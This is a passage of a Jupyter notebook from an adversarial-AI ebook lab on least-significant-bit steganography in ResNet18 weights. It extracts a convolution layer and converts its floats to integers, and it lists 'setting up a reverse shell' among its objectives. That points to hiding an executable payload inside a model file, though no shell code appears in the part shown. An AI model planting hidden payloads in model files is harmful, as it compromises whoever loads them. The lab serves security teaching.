{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0df8daf4",
   "metadata": {},
   "source": [
    "<img style=\"max-width:20em; height:auto;\" src=\"../graphics/A-Little-Book-on-Adversarial-AI-Cover.png\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2addd841",
   "metadata": {},
   "source": [
    "Author: Nik Alleyne   \n",
    "Author Blog: https://www.securitynik.com   \n",
    "Author GitHub: github.com/securitynik   \n",
    "\n",
    "Author Other Books: [   \n",
    "\n",
    "            \"https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/\",   \n",
    "            \n",
    "            \"https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/\"   \n",
    "        ]   \n",
    "\n",
    "\n",
    "This notebook ***(stego_lsb.ipynb)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ac4ea7d8",
   "metadata": {},
   "source": [
    "### Steganography more advanced with Least Significant Bit (LSB)   "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "35f87490",
   "metadata": {},
   "source": [
    "### Lab Objectives:  \n",
    "- Build on the foundations laid in the **stego_basic.ipynb** lab    \n",
    "- Learn about least significant bit (LSB) steganography   \n",
    "- Encode content in the LSB   \n",
    "- Decode content stored within the LSB   \n",
    "- Leverage a pre-trained model to perform our steganography tasks  \n",
    "- Setting up a reverse shell \n",
    "- Leverage base64 encoding   \n",
    "- Convert base64 encoding to bits  \n",
    "\n",
    "### Step 1:   \n",
    "Get the pre-trained model  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "id": "4b7c8917",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import the needed libraries\n",
    "import torch\n",
    "import torchinfo\n",
    "\n",
    "# Will be using a pretrained resnet model\n",
    "from torchvision.models import resnet18, ResNet18_Weights\n",
    "\n",
    "# This will assist us with conversion to and from binary and other formats\n",
    "import struct\n",
    "\n",
    "import base64\n",
    "import numpy as np\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "id": "9a754298",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Setting the device to cuda\n"
     ]
    }
   ],
   "source": [
    "# Setup the device to work with\n",
    "# This should ensure if there are accelerators in place, such as Apple backend or CUDA, \n",
    "# we should be able to take advantage of it.\n",
    "\n",
    "if torch.cuda.is_available():\n",
    "    print('Setting the device to cuda')\n",
    "    device = 'cuda'\n",
    "elif torch.backends.mps.is_available():\n",
    "    print('Setting the device to Apple mps')\n",
    "    device = 'mps'\n",
    "else:\n",
    "    print('Setting the device to CPU')\n",
    "    device = torch.device('cpu')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0abd18c6",
   "metadata": {},
   "source": [
    "For this purpose, we will use a pre-trained ResNet8 model. Nothing interesting about this choice, just that I wanted something that was readily accessible. Yes there are many others that are available, I just choose this one because ... "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "id": "64ab8a6b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "ResNet(\n",
       "  (conv1): Conv2d(3, 64, kernel_size=(7, 7), stride=(2, 2), padding=(3, 3), bias=False)\n",
       "  (bn1): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "  (relu): ReLU(inplace=True)\n",
       "  (maxpool): MaxPool2d(kernel_size=3, stride=2, padding=1, dilation=1, ceil_mode=False)\n",
       "  (layer1): Sequential(\n",
       "    (0): BasicBlock(\n",
       "      (conv1): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "    )\n",
       "    (1): BasicBlock(\n",
       "      (conv1): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "    )\n",
       "  )\n",
       "  (layer2): Sequential(\n",
       "    (0): BasicBlock(\n",
       "      (conv1): Conv2d(64, 128, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (downsample): Sequential(\n",
       "        (0): Conv2d(64, 128, kernel_size=(1, 1), stride=(2, 2), bias=False)\n",
       "        (1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      )\n",
       "    )\n",
       "    (1): BasicBlock(\n",
       "      (conv1): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "    )\n",
       "  )\n",
       "  (layer3): Sequential(\n",
       "    (0): BasicBlock(\n",
       "      (conv1): Conv2d(128, 256, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(256, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(256, 256, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(256, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (downsample): Sequential(\n",
       "        (0): Conv2d(128, 256, kernel_size=(1, 1), stride=(2, 2), bias=False)\n",
       "        (1): BatchNorm2d(256, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      )\n",
       "    )\n",
       "    (1): BasicBlock(\n",
       "      (conv1): Conv2d(256, 256, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(256, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(256, 256, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(256, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "    )\n",
       "  )\n",
       "  (layer4): Sequential(\n",
       "    (0): BasicBlock(\n",
       "      (conv1): Conv2d(256, 512, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(512, 512, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (downsample): Sequential(\n",
       "        (0): Conv2d(256, 512, kernel_size=(1, 1), stride=(2, 2), bias=False)\n",
       "        (1): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      )\n",
       "    )\n",
       "    (1): BasicBlock(\n",
       "      (conv1): Conv2d(512, 512, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(512, 512, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "    )\n",
       "  )\n",
       "  (avgpool): AdaptiveAvgPool2d(output_size=(1, 1))\n",
       "  (fc): Linear(in_features=512, out_features=1000, bias=True)\n",
       ")"
      ]
     },
     "execution_count": 67,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Get the model\n",
    "model = resnet18(weights=ResNet18_Weights.DEFAULT)\n",
    "\n",
    "# Put the model in eval mode\n",
    "model.eval()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "id": "966b4a98",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "=================================================================\n",
       "Layer (type:depth-idx)                   Param #\n",
       "=================================================================\n",
       "ResNet                                   --\n",
       "├─Conv2d: 1-1                            9,408\n",
       "├─BatchNorm2d: 1-2                       128\n",
       "├─ReLU: 1-3                              --\n",
       "├─MaxPool2d: 1-4                         --\n",
       "├─Sequential: 1-5                        --\n",
       "│    └─BasicBlock: 2-1                   --\n",
       "│    │    └─Conv2d: 3-1                  36,864\n",
       "│    │    └─BatchNorm2d: 3-2             128\n",
       "│    │    └─ReLU: 3-3                    --\n",
       "│    │    └─Conv2d: 3-4                  36,864\n",
       "│    │    └─BatchNorm2d: 3-5             128\n",
       "│    └─BasicBlock: 2-2                   --\n",
       "│    │    └─Conv2d: 3-6                  36,864\n",
       "│    │    └─BatchNorm2d: 3-7             128\n",
       "│    │    └─ReLU: 3-8                    --\n",
       "│    │    └─Conv2d: 3-9                  36,864\n",
       "│    │    └─BatchNorm2d: 3-10            128\n",
       "├─Sequential: 1-6                        --\n",
       "│    └─BasicBlock: 2-3                   --\n",
       "│    │    └─Conv2d: 3-11                 73,728\n",
       "│    │    └─BatchNorm2d: 3-12            256\n",
       "│    │    └─ReLU: 3-13                   --\n",
       "│    │    └─Conv2d: 3-14                 147,456\n",
       "│    │    └─BatchNorm2d: 3-15            256\n",
       "│    │    └─Sequential: 3-16             8,448\n",
       "│    └─BasicBlock: 2-4                   --\n",
       "│    │    └─Conv2d: 3-17                 147,456\n",
       "│    │    └─BatchNorm2d: 3-18            256\n",
       "│    │    └─ReLU: 3-19                   --\n",
       "│    │    └─Conv2d: 3-20                 147,456\n",
       "│    │    └─BatchNorm2d: 3-21            256\n",
       "├─Sequential: 1-7                        --\n",
       "│    └─BasicBlock: 2-5                   --\n",
       "│    │    └─Conv2d: 3-22                 294,912\n",
       "│    │    └─BatchNorm2d: 3-23            512\n",
       "│    │    └─ReLU: 3-24                   --\n",
       "│    │    └─Conv2d: 3-25                 589,824\n",
       "│    │    └─BatchNorm2d: 3-26            512\n",
       "│    │    └─Sequential: 3-27             33,280\n",
       "│    └─BasicBlock: 2-6                   --\n",
       "│    │    └─Conv2d: 3-28                 589,824\n",
       "│    │    └─BatchNorm2d: 3-29            512\n",
       "│    │    └─ReLU: 3-30                   --\n",
       "│    │    └─Conv2d: 3-31                 589,824\n",
       "│    │    └─BatchNorm2d: 3-32            512\n",
       "├─Sequential: 1-8                        --\n",
       "│    └─BasicBlock: 2-7                   --\n",
       "│    │    └─Conv2d: 3-33                 1,179,648\n",
       "│    │    └─BatchNorm2d: 3-34            1,024\n",
       "│    │    └─ReLU: 3-35                   --\n",
       "│    │    └─Conv2d: 3-36                 2,359,296\n",
       "│    │    └─BatchNorm2d: 3-37            1,024\n",
       "│    │    └─Sequential: 3-38             132,096\n",
       "│    └─BasicBlock: 2-8                   --\n",
       "│    │    └─Conv2d: 3-39                 2,359,296\n",
       "│    │    └─BatchNorm2d: 3-40            1,024\n",
       "│    │    └─ReLU: 3-41                   --\n",
       "│    │    └─Conv2d: 3-42                 2,359,296\n",
       "│    │    └─BatchNorm2d: 3-43            1,024\n",
       "├─AdaptiveAvgPool2d: 1-9                 --\n",
       "├─Linear: 1-10                           513,000\n",
       "=================================================================\n",
       "Total params: 11,689,512\n",
       "Trainable params: 11,689,512\n",
       "Non-trainable params: 0\n",
       "================================================================="
      ]
     },
     "execution_count": 68,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Look at the model summary from a different perspective\n",
    "torchinfo.summary(model=model)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "77b04c65",
   "metadata": {},
   "source": [
    "Looking above, we can see the convolutional (Conv2d) layers occupy most of the parameters. For example in *Sequential 1-8*, there is a  *Conv2d* layer has *2,359,296* parameters. Let's extract one of these conv2 layers as it gives us more values to modify if needed. How many of these we use will be dependent on the size of our payload. Let's keep everything simple to build a solid intuition .   \n",
    "\n",
    "We will create a random input just to ensure the model works. No need get a true item. We are not interested in making predictions with this model, but instead to manipulate the bits in the model.  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "id": "187bfeee",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor(107)"
      ]
     },
     "execution_count": 69,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Create some noise just to validate our model works\n",
    "torch.random.manual_seed(10)\n",
    "sample = torch.randn(1, 3, 224,224)\n",
    "model(sample).argmax()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "id": "9a0e3575",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "=================================================================\n",
       "Layer (type:depth-idx)                   Param #\n",
       "=================================================================\n",
       "Conv2d                                   2,359,296\n",
       "=================================================================\n",
       "Total params: 2,359,296\n",
       "Trainable params: 2,359,296\n",
       "Non-trainable params: 0\n",
       "================================================================="
      ]
     },
     "execution_count": 70,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Get the convolution layer\n",
    "# We see below it has over two million parameters\n",
    "torchinfo.summary(model.layer4[0].conv2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b03417a1",
   "metadata": {},
   "source": [
    "Begin the process of getting the data for the encoding process.\n",
    "Get the weights for the Conv layer. This will need to be modified.  \n",
    "As always, do keep in mind, there are many ways to solve the problem we are attempting to solve. This is just *a* way, not *the* way. Keeping things simple ...   \n",
    "\n",
    "### Step 2:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "id": "d51d3f02",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([[[[ 1.62181284e-04, -1.47199407e-02, -1.69999395e-02],\n",
       "         [-1.28500955e-02, -3.30852978e-02, -3.66563089e-02],\n",
       "         [ 2.78122760e-02,  1.76906902e-02, -1.83694568e-02]],\n",
       "\n",
       "        [[ 1.05281081e-02,  3.13793421e-02,  2.48009339e-02],\n",
       "         [-1.26983114e-02, -2.94529907e-02, -1.18338577e-02],\n",
       "         [-9.40940063e-03, -8.94617196e-03, -3.13491896e-02]],\n",
       "\n",
       "        [[-7.84474425e-03, -2.92557515e-02,  5.35898376e-03],\n",
       "         [-1.37909846e-02, -1.11159543e-02,  5.03876805e-03],\n",
       "         [-2.49185646e-03,  7.35136494e-03,  5.40132588e-03]],\n",
       "\n",
       "        ...,\n",
       "\n",
       "        [[-1.02762214e-03, -1.02751562e-02, -2.99858768e-02],\n",
       "         [-3.84650612e-03,  1.95492618e-03, -1.62906740e-02],\n",
       "         [-1.81004079e-03,  8.37781187e-03, -8.54805205e-03]],\n",
       "\n",
       "        [[-1.81962792e-02, -1.35327894e-02, -1.74573641e-02],\n",
       "         [ 2.24572346e-02,  5.74022010e-02,  1.93248764e-02],\n",
       "         [-2.49767341e-02, -3.21133211e-02, -8.17802455e-03]],\n",
       "\n",
       "        [[ 3.65504134e-03,  4.93583083e-03, -5.75966481e-03],\n",
       "         [-1.68749820e-02,  1.39988129e-04,  3.76286946e-04],\n",
       "         [-2.62718881e-03,  1.09471404e-03,  1.11453130e-03]]],\n",
       "\n",
       "\n",
       "       [[[ 1.40180187e-02,  3.91979842e-03, -1.71888561e-03],\n",
       "         [-1.31746067e-03,  4.35029535e-04, -1.17980223e-02],\n",
       "         [-9.80026927e-03, -1.76928267e-02, -1.99099407e-02]],\n",
       "\n",
       "        [[-1.49566382e-02, -1.97957959e-02, -2.87236534e-02],\n",
       "         [ 5.89079736e-03, -1.52283655e-02, -5.67153841e-03],\n",
       "         [ 2.92843161e-03, -1.80283878e-02, -7.14329816e-03]],\n",
       "\n",
       "        [[-1.16245085e-02, -3.38037647e-02, -1.00251390e-02],\n",
       "         [-1.66061223e-02, -5.57158440e-02, -2.32044794e-02],\n",
       "         [-2.57584639e-02, -4.31348197e-02, -2.59008184e-02]],\n",
       "\n",
       "        ...,\n",
       "\n",
       "        [[-1.50073962e-02, -1.43327378e-02, -2.59366608e-03],\n",
       "         [-2.30783280e-02, -1.58196539e-02, -2.28182459e-03],\n",
       "         [-4.13179956e-03, -8.03528447e-03, -2.32363143e-03]],\n",
       "\n",
       "        [[-1.85312871e-02, -1.80041026e-02, -2.80842595e-02],\n",
       "         [-3.66796628e-02, -6.86411709e-02, -5.24688698e-02],\n",
       "         [-1.17119672e-02, -2.43339781e-02, -1.67325977e-02]],\n",
       "\n",
       "        [[-2.20780168e-02, -2.91629992e-02, -3.87172913e-03],\n",
       "         [-7.03006238e-03,  1.67180784e-02,  5.43386256e-03],\n",
       "         [-1.31311258e-02,  1.19989524e-02, -1.74796320e-02]]],\n",
       "\n",
       "\n",
       "       [[[-5.23775816e-03, -3.48900910e-03, -2.08507036e-03],\n",
       "         [ 1.53060956e-02, -2.17515416e-02, -8.76816548e-03],\n",
       "         [ 2.24595014e-02,  9.91751347e-03, -3.36346193e-03]],\n",
       "\n",
       "        [[ 7.46767269e-03, -9.17616766e-03, -9.25690401e-05],\n",
       "         [ 1.94409251e-04,  1.23438449e-03, -8.99784546e-03],\n",
       "         [-5.12427883e-04,  2.18500805e-04, -4.88283904e-03]],\n",
       "\n",
       "        [[ 1.70777328e-02,  3.39552970e-03,  9.35025699e-03],\n",
       "         [ 2.03336217e-02, -1.06208106e-04, -8.20171190e-05],\n",
       "         [ 1.07064471e-02, -1.84142555e-03,  1.08280526e-02]],\n",
       "\n",
       "        ...,\n",
       "\n",
       "        [[ 3.20077874e-02,  2.34938134e-02,  2.53859647e-02],\n",
       "         [ 1.93074085e-02,  2.39237286e-02,  2.89717205e-02],\n",
       "         [ 9.90026910e-03,  2.01582350e-02,  2.26554517e-02]],\n",
       "\n",
       "        [[-9.83948447e-03, -1.11142909e-02, -3.76964337e-03],\n",
       "         [-2.95080673e-02, -3.69563513e-02, -1.82275474e-02],\n",
       "         [-1.36630971e-03, -2.58451700e-03,  1.03517752e-02]],\n",
       "\n",
       "        [[-7.38670211e-03, -2.54128780e-02, -2.19417028e-02],\n",
       "         [-1.66987181e-02, -1.51334060e-02, -1.30296145e-02],\n",
       "         [-2.00898144e-02,  3.79697001e-03, -1.03413910e-02]]],\n",
       "\n",
       "\n",
       "       ...,\n",
       "\n",
       "\n",
       "       [[[-1.61565859e-02, -1.68833174e-02, -2.83278932e-04],\n",
       "         [-7.77586782e-03, -2.44649989e-03, -1.46405175e-02],\n",
       "         [ 2.46391501e-02,  3.98620591e-02,  2.10477337e-02]],\n",
       "\n",
       "        [[ 2.44905218e-03, -9.38848406e-03, -1.17855314e-02],\n",
       "         [ 2.53005177e-02,  2.56254774e-04,  7.13347504e-03],\n",
       "         [ 2.23419294e-02,  1.90418325e-02,  7.25264987e-03]],\n",
       "\n",
       "        [[-1.46522364e-02, -2.78023798e-02, -4.35639312e-03],\n",
       "         [-1.79608762e-02, -4.38462123e-02,  2.74086208e-03],\n",
       "         [-4.79676900e-03, -8.42313562e-03,  1.20701296e-02]],\n",
       "\n",
       "        ...,\n",
       "\n",
       "        [[-2.01709457e-02, -3.35464217e-02, -1.67284384e-02],\n",
       "         [-1.78472996e-02, -5.17126769e-02, -2.67803911e-02],\n",
       "         [-1.31451420e-03, -4.31805104e-03, -9.63731762e-03]],\n",
       "\n",
       "        [[-5.39165828e-03, -2.04103635e-04,  2.77978322e-03],\n",
       "         [-9.68821172e-04, -2.51412056e-02,  1.48037998e-02],\n",
       "         [ 2.87483688e-02,  9.08322446e-03,  4.25483547e-02]],\n",
       "\n",
       "        [[-1.56978816e-02, -1.93031393e-02, -9.14690923e-03],\n",
       "         [-2.00250130e-02, -1.11307222e-02, -3.39015946e-02],\n",
       "         [-5.74355340e-03, -7.36401090e-03, -1.00440951e-02]]],\n",
       "\n",
       "\n",
       "       [[[-8.86119623e-03, -4.53702779e-03, -1.23542612e-02],\n",
       "         [-5.92447119e-03, -1.70583595e-02, -2.80411821e-02],\n",
       "         [-1.04353484e-02,  7.66948564e-04, -1.05781769e-02]],\n",
       "\n",
       "        [[ 9.52000171e-03, -5.19752083e-03,  1.29465330e-02],\n",
       "         [ 4.43047704e-03, -2.39923447e-02, -8.45689501e-04],\n",
       "         [ 4.66079358e-03,  9.67867021e-03,  8.21738131e-03]],\n",
       "\n",
       "        [[ 5.15586184e-03,  4.46347491e-04, -7.99339637e-03],\n",
       "         [ 3.30687198e-03,  1.44503741e-02,  8.92335176e-03],\n",
       "         [ 6.34017307e-03,  1.90432016e-02,  1.90211628e-02]],\n",
       "\n",
       "        ...,\n",
       "\n",
       "        [[ 7.69642647e-03, -1.37772318e-02,  6.05387846e-03],\n",
       "         [-1.57454575e-03, -2.33908854e-02, -1.00517459e-02],\n",
       "         [ 9.51827597e-03, -1.22509832e-02,  2.24360777e-03]],\n",
       "\n",
       "        [[ 1.03751607e-02,  3.58750834e-03, -5.79399988e-04],\n",
       "         [ 7.04124384e-03, -1.06728626e-02, -4.91204532e-03],\n",
       "         [-2.60340422e-03,  1.13058537e-02,  7.06958864e-03]],\n",
       "\n",
       "        [[-1.75091624e-02, -2.31818501e-02, -1.78965461e-02],\n",
       "         [-1.77690771e-03,  1.96724618e-03, -7.32195424e-03],\n",
       "         [-6.68332865e-03,  9.82862152e-03,  2.06528348e-03]]],\n",
       "\n",
       "\n",
       "       [[[ 2.83747297e-02, -8.19361117e-03,  1.80086903e-02],\n",
       "         [ 1.58291981e-02, -1.35713769e-02, -1.93354841e-02],\n",
       "         [ 4.07664431e-03, -1.57215744e-02, -5.06203547e-02]],\n",
       "\n",
       "        [[-5.53100370e-03, -1.89964026e-02, -7.94360880e-03],\n",
       "         [ 1.38247095e-03, -4.96078357e-02,  1.72558485e-03],\n",
       "         [ 7.66289933e-03, -7.61006633e-03,  1.25412196e-02]],\n",
       "\n",
       "        [[ 1.80524364e-02,  3.17184143e-02,  4.25557932e-03],\n",
       "         [-3.67596606e-03,  3.04904371e-03, -1.22636268e-02],\n",
       "         [-8.94036703e-03, -1.66044999e-02,  1.63477135e-03]],\n",
       "\n",
       "        ...,\n",
       "\n",
       "        [[ 5.31915575e-03,  1.82035565e-02,  1.81135964e-02],\n",
       "         [-6.12021843e-03,  1.59048475e-03,  2.02644821e-02],\n",
       "         [-1.14705898e-02, -1.56968776e-02,  9.08706244e-03]],\n",
       "\n",
       "        [[ 3.77070578e-03,  8.05985555e-03,  1.82900820e-02],\n",
       "         [ 1.72573235e-02,  6.96382811e-03,  1.87458228e-02],\n",
       "         [ 1.07508302e-02,  1.36630833e-02, -1.00809906e-03]],\n",
       "\n",
       "        [[ 1.97106171e-02, -1.45689435e-02, -2.46633124e-02],\n",
       "         [ 2.59659952e-03, -2.48067528e-02,  9.38608404e-03],\n",
       "         [-1.28762785e-03,  1.39735814e-03,  1.34337237e-02]]]],\n",
       "      dtype=float32)"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Get the model layer weights as numpy data\n",
    "conv_layer_extracted = model.layer4[0].conv2.weight.data.numpy()\n",
    "conv_layer_extracted"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0f11da96",
   "metadata": {},
   "source": [
    "These values should not look surprising to you. In the book, we spoke about the model parameters (weights and biases) being stored as 32bit floating-point values. If you look closely at the bottom of the output above, you see that it reports **dtype=float32**. We can also confirm this via ..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "id": "25276058",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The weights data type is: float32\n"
     ]
    }
   ],
   "source": [
    "print(f'The weights data type is: {conv_layer_extracted.dtype}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "id": "7cc40490",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Before modifying the (512, 512, 3, 3)\n",
      "Above shows we have 4 dimensions\n"
     ]
    }
   ],
   "source": [
    "# Let's get the conv layer shape first\n",
    "conv_layer_shape = conv_layer_extracted.shape\n",
    "print(f'Before modifying the {conv_layer_shape}')\n",
    "print(f'Above shows we have {conv_layer_extracted.ndim} dimensions')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8b704459",
   "metadata": {},
   "source": [
    "We can work with the data in the four dimensions shown above. However, it would be much easier, if we reshape this to one dimension, making it a vector. Let us do that instead. Remember, we are not trying to make our task unnecessarily complex. Simplicity is my mantra."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "id": "7ea64464",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "After reshaping, we now have 1 dimensions\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([ 0.00016218, -0.01471994, -0.01699994, ..., -0.00128763,\n",
       "        0.00139736,  0.01343372], dtype=float32)"
      ]
     },
     "execution_count": 74,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Flattening the data\n",
    "conv_layer_flat = conv_layer_extracted.reshape(-1)\n",
    "print(f'After reshaping, we now have {conv_layer_flat.ndim} dimensions')\n",
    "conv_layer_flat"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8c666018",
   "metadata": {},
   "source": [
    "With the conv2d layer flattened, let us move ahead. Here is how we will operate at this point, on the data above.   \n",
    "- Take those floating-point values and represent them as integers. The integer we can manipulate easier   \n",
    "- To keep things simple, we will take the first value above 0.0002 as an example\n",
    "-  We will write the code on multiple lines for simplicity. Do note, this could all be done on one line    \n",
    "\n",
    "- The **@** tells struct to use the native byte order. This system is Little Endian, so this will be used by default. Alternatively, we could have used **<** as explained in the book section.\n",
    "- The **f** states we are using a float as input"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "id": "055fafb3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The type of the packed object is: <class 'bytes'>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x17\\xb7Q9'"
      ]
     },
     "execution_count": 75,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Packing the float to a binary value\n",
    "float_packed = struct.pack('@f', 0.0002)\n",
    "print(f'The type of the packed object is: {type(float_packed)}')\n",
    "float_packed"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "02e011c2",
   "metadata": {},
   "source": [
    "Above we see the above, we have a bytes object that represents the packed data in binary format. From this packed value, we can now request its integer value via unpacking. The result from **unpack** returns a tuple, we only need the first item in the tuple, hence [0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "id": "df3f4dbc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The type of the unpacked object is: <class 'int'>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "961656599"
      ]
     },
     "execution_count": 76,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# We already know what the '@' is for. \n",
    "# The 'i' means unpack as an int\n",
    "# notice the [0], this is because the result returned via a tuple\n",
    "float_as_int = struct.unpack('@i', float_packed)[0]\n",
    "print(f'The type of the unpacked object is: {type(float_as_int)}')\n",
    "\n",
    "float_as_int"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ecb5b62b",
   "metadata": {},
   "source": [
    "Well we know at this point we can go from float to integer. Can can recover this process back to the original float from this integer?   \n",
    "\n",
    "Original value was 0.0002, except for the fact that 0.0002 was rounded for our convenience   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "id": "76f9dede",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.00019999999494757503"
      ]
     },
     "execution_count": 77,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Looking below, the values are virtually the same\n",
    "# Notice also, I have no @. The system will once again, infer the native byte ordering.\n",
    "struct.unpack('f', struct.pack('i', float_as_int))[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "id": "89df0e17",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'little'"
      ]
     },
     "execution_count": 78,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# if you wanted to see the byte order of your system, you could use the sys module below\n",
    "import sys\n",
    "sys.byteorder"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "27cfab8d",
   "metadata": {},
   "source": [
